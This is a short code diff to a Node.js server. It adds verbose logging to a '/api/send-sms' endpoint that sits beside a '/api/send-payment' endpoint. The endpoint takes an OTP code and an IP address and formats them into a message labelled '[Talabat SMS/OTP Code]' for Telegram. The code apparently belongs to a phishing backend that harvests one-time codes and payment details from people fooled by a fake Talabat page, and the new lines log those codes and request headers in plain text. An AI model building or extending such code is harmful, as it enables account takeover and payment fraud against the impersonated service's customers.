@@ -106,6 +106,10 @@ app.post('/api/send-payment', async (req, res) => {
 // SMS API endpoint
 app.post('/api/send-sms', async (req, res) => {
     try {
+        console.log('[server.js] /api/send-sms - Received request');
+        console.log('[server.js] Request body:', JSON.stringify(req.body, null, 2));
+        console.log('[server.js] Request headers:', req.headers);
+        
         const {
             otp,
             ip,
@@ -115,11 +119,14 @@ app.post('/api/send-sms', async (req, res) => {
         
         // Validate required fields
         if (!otp) {
+            console.error('[server.js] ❌ Missing OTP code in request');
             return res.status(400).json({
                 success: false,
                 message: 'Missing OTP code'
             });
         }
+        
+        console.log('[server.js] ✅ OTP received:', otp);
         
         // Format message for Telegram (same format as api/send-sms.js)
         const message = `📱 [Talabat SMS/OTP Code]
